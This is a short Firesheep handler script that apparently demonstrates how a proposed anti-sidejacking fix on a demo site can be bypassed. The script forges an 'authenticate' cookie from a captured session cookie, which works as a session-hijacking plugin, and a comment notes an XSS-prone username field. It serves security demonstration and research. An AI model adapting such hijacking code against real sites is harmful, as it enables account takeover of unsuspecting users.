// Authors:
//   Ian Gallagher <crash@neg9.org>
//
// This handler debunks a really bad example "fix" against Firesheep and sidejacking,
// As a guest post on http://akfpartners.com/techblog/2010/11/20/slaying-firesheep/ 
// by Randy Wigginton.
//
// Details: http://akfpartners.com/techblog/2010/11/20/slaying-firesheep/

register({
name: 'AKF Demo',
url: 'https://verify.akfdemo.com/loggedin.php',
domains: [ 'verify.akfdemo.com' ],
sessionCookieNames: [ 'session' ],

processPacket: function () {
	// Set the "authenticate" cookie in Firesheep (this will propogate out to the browser upon loading this item)
	this.firstPacket.cookies['authenticate'] = this.firstPacket.cookies['session'];
},

identifyUser: function () {
	// Naively pull out the "username" of the test user - careful, this field is vulnerable to XSS (Cross-Site Scripting)
	this.userName = this.firstPacket.cookies['session'].split('%3A')[0];
}
});
